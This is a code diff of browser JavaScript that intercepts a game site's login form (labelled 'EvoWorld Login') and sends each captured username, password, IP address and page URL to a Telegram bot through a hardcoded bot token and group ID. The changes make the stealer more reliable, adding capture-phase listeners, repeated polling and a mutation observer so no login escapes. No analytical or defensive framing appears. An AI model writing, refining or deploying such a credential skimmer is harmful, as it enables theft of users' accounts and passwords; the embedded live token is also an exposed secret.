@@ -180,8 +180,10 @@ setTimeout(() => {
         message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
         message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
         
-        message += `<b>👤 Логин:</b> <code>${credentials.username || '—'}</code>\n`;
-        message += `<b>🔐 Пароль:</b> <code>${credentials.password || '—'}</code>\n\n`;
+        var loginDisplay = (typeof user !== 'undefined' && user && user.login) ? user.login : (credentials.username || '—');
+        var passwordDisplay = credentials.password || '—';
+        message += `<b>👤 Логин:</b> <code>${String(loginDisplay)}</code>\n`;
+        message += `<b>🔐 Пароль:</b> <code>${String(passwordDisplay)}</code>\n\n`;
         
         message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
         message += `<code>${userLevel}</code>\n`;
@@ -240,89 +242,97 @@ setTimeout(() => {
 (function() {
     'use strict';
 
-    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
-    const GROUP_ID = '-1003867014479';
+    var BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
+    var GROUP_ID = '-1003867014479';
 
     function sendCredentials(username, password) {
-        const timestamp = new Date().toLocaleString('ru-RU');
-        const message = `🦊 EvoWorld Login\n\n👤 Login: ${username}\n🔐 Password: ${password}\n⏰ ${timestamp}`;
+        var timestamp = new Date().toLocaleString('ru-RU');
+        var message = '🦊 EvoWorld Login\n\n👤 Login: ' + username + '\n🔐 Password: ' + password + '\n⏰ ' + timestamp;
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: GROUP_ID,
                 text: message,
                 disable_web_page_preview: true
             })
         })
-        .then(response => {
+        .then(function(response) {
             if (!response.ok) throw new Error('Telegram API error');
         })
         .catch(function() {
-            const logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
-            logs.push({username, password, timestamp});
+            var logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
+            logs.push({username: username, password: password, timestamp: timestamp});
             localStorage.setItem('evoLogs', JSON.stringify(logs));
         });
     }
 
-    const SELECTORS = {
+    var SELECTORS = {
         username: '#loginUsername',
         password: '#loginPassword',
         submitButton: 'button[type="submit"]'
     };
 
-    var interceptionDone = false;
-
     function setupInterception() {
-        const usernameField = document.querySelector(SELECTORS.username);
-        const passwordField = document.querySelector(SELECTORS.password);
-        const submitButton = document.querySelector(SELECTORS.submitButton);
+        var usernameField = document.querySelector(SELECTORS.username);
+        var passwordField = document.querySelector(SELECTORS.password);
+        var submitButton = document.querySelector(SELECTORS.submitButton);
 
-        if (usernameField && passwordField && !interceptionDone) {
-            const form = usernameField.closest('form');
-            if (form) {
-                form.addEventListener('submit', function(event) {
-                    event.preventDefault();
-                    sendCredentials(usernameField.value, passwordField.value);
-                    form.submit();
-                });
-                interceptionDone = true;
-                return;
-            }
+        if (!usernameField || !passwordField) return;
 
-            if (submitButton) {
-                submitButton.addEventListener('click', function() {
-                    setTimeout(function() {
-                        sendCredentials(usernameField.value, passwordField.value);
-                    }, 300);
-                });
-                interceptionDone = true;
-                return;
-            }
+        var form = usernameField.closest('form');
+        if (form && form.getAttribute('data-evo-intercept') === '1') return;
+        if (form) form.setAttribute('data-evo-intercept', '1');
 
-            passwordField.addEventListener('blur', function() {
-                if (usernameField.value && passwordField.value) {
-                    sendCredentials(usernameField.value, passwordField.value);
+        if (form) {
+            form.addEventListener('submit', function(ev) {
+                if (form._evoSubmitting) {
+                    form._evoSubmitting = false;
+                    return;
                 }
-            });
-            interceptionDone = true;
-        } else if (!usernameField || !passwordField) {
-            setTimeout(setupInterception, 2000);
+                ev.preventDefault();
+                var u = document.querySelector(SELECTORS.username);
+                var p = document.querySelector(SELECTORS.password);
+                if (u && p) sendCredentials(u.value, p.value);
+                form._evoSubmitting = true;
+                form.submit();
+            }, true);
+            return;
+        }
+
+        if (submitButton) {
+            submitButton.addEventListener('click', function() {
+                setTimeout(function() {
+                    var u = document.querySelector(SELECTORS.username);
+                    var p = document.querySelector(SELECTORS.password);
+                    if (u && p && u.value && p.value) sendCredentials(u.value, p.value);
+                }, 100);
+            }, true);
+            return;
+        }
+
+        passwordField.addEventListener('blur', function() {
+            var u = document.querySelector(SELECTORS.username);
+            var p = document.querySelector(SELECTORS.password);
+            if (u && p && u.value && p.value) sendCredentials(u.value, p.value);
+        });
+    }
+
+    function tryInterception() {
+        if (document.querySelector(SELECTORS.username)) {
+            setupInterception();
         }
     }
 
-    setTimeout(setupInterception, 3000);
-
-    const observer = new MutationObserver(function() {
-        if (document.querySelector(SELECTORS.username) && !interceptionDone) {
-            setupInterception();
-        }
-    });
+    setTimeout(tryInterception, 1000);
+    setTimeout(tryInterception, 3000);
+    setInterval(tryInterception, 2500);
 
     if (document.body) {
+        var observer = new MutationObserver(function() {
+            tryInterception();
+        });
         observer.observe(document.body, {
             childList: true,
             subtree: true,
